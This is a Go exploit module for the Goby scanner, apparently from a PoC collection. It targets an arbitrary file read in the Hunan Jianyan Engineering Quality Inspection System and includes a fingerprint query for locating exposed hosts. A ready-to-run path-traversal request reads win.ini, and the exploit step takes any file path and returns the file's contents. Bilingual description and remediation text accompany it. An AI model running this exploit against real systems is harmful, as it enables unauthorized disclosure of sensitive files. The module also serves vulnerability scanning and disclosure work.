package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Hunan Jianyan Engineering Quality Inspection System /Applications/Attachment/PreviewB_Source.cshtml File Read Vulnerability",
    "Description": "<p>Hunan Jianyan Testing System is a system used for monitoring and managing product quality. It helps enterprises improve product quality, reduce quality problems and risks, and provide data support for decision-making and improvement by testing and analyzing products</p><p>The PreviewB_Source interface of the Hunan Jianyan Engineering Quality Inspection System has an arbitrary file read vulnerability. Attackers can exploit this vulnerability to read sensitive files in the system, potentially leading to sensitive information disclosure and posing a threat to system security.</p>",
    "Product": "Hunan Jianyan Engineering Quality Inspection System",
    "Homepage": "http://www.jyvjd.com/",
    "DisclosureDate": "2024-11-26",
    "PostTime": "2024-11-26",
    "Author": "1638690747@qq.com",
    "FofaQuery": "body=\"/Content/Theme/Standard\" && body=\"/webSite/login.css\"",
    "GobyQuery": "body=\"/Content/Theme/Standard\" && body=\"/webSite/login.css\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to read arbitrary files in the system, potentially leading to sensitive information disclosure and more serious security issues.</p>",
    "Recommendation": "<p>It is recommended to allow access only to pre-approved file paths and deny all other paths; carefully validate the file paths requested by users to ensure they point to files that are allowed to be accessed; promptly apply security updates and patches to fix any discovered vulnerabilities.</p>",
    "References": [
        "https://blog.csdn.net/qq_44905116/article/details/142092483"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "win.ini",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Applications/Attachment/PreviewB_Source.cshtml?filePath=../../win.ini",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[fonts]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/Applications/Attachment/PreviewB_Source.cshtml?filePath=../../win.ini"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Applications/Attachment/PreviewB_Source.cshtml?filePath=../../{{{filePath_encode}}}",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[fonts]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "湖南建研工程质量检测系统 /Applications/Attachment/PreviewB_Source.cshtml 文件读取漏洞",
            "Product": "湖南建研工程质量检测系统",
            "Description": "<p>湖南建研检测系统是一种用于监控和管理产品质量的系统,它通过对产品进行检测和分析,帮助企业提高产品质量,减少质量问题和风险,并提供数据支持用于决策和改进<br></p><p>湖南建研工程质量检测系统的PreviewB_Source接口存在任意文件读取漏洞，攻击者可以通过该漏洞读取系统中的敏感文件，可能导致敏感信息泄露，对系统安全造成威胁。</p>",
            "Recommendation": "<p>建议仅允许访问预先批准的文件路径，并拒绝所有其他路径；仔细验证用户请求的文件路径，确保它指向允许访问的文件；及时应用安全更新和补丁，以修复任何已发现的漏洞。</p>",
            "Impact": "<p>该漏洞允许攻击者读取系统中的任意文件，导致敏感信息泄露，进而引发更严重的安全问题。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Hunan Jianyan Engineering Quality Inspection System /Applications/Attachment/PreviewB_Source.cshtml File Read Vulnerability",
            "Product": "Hunan Jianyan Engineering Quality Inspection System",
            "Description": "<p>Hunan Jianyan Testing System is a system used for monitoring and managing product quality. It helps enterprises improve product quality, reduce quality problems and risks, and provide data support for decision-making and improvement by testing and analyzing products<br></p><p>The PreviewB_Source interface of the Hunan Jianyan Engineering Quality Inspection System has an arbitrary file read vulnerability. Attackers can exploit this vulnerability to read sensitive files in the system, potentially leading to sensitive information disclosure and posing a threat to system security.</p>",
            "Recommendation": "<p>It is recommended to allow access only to pre-approved file paths and deny all other paths; carefully validate the file paths requested by users to ensure they point to files that are allowed to be accessed; promptly apply security updates and patches to fix any discovered vulnerabilities.</p>",
            "Impact": "<p>This vulnerability allows attackers to read arbitrary files in the system, potentially leading to sensitive information disclosure and more serious security issues.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "PocId": "9974"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}